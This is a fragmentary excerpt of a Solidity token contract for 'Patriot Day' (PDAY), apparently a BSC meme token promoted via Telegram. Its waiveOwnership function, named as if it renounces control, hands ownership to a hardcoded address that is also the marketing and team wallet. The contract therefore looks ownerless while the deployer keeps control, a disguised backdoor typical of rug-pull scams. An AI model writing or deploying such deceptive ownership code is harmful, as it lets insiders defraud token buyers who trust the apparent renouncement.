...
/**
Telegram : https://t.me/PatriotDayBSC
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x38aDF09038dFC85e076F8a77A34a1B18505B19ca);
    }
...
contract PatriotDay is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Patriot Day";
    string private _symbol = "PDAY";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x38aDF09038dFC85e076F8a77A34a1B18505B19ca);
    address payable private teamWalletAddress = payable(0x38aDF09038dFC85e076F8a77A34a1B18505B19ca);
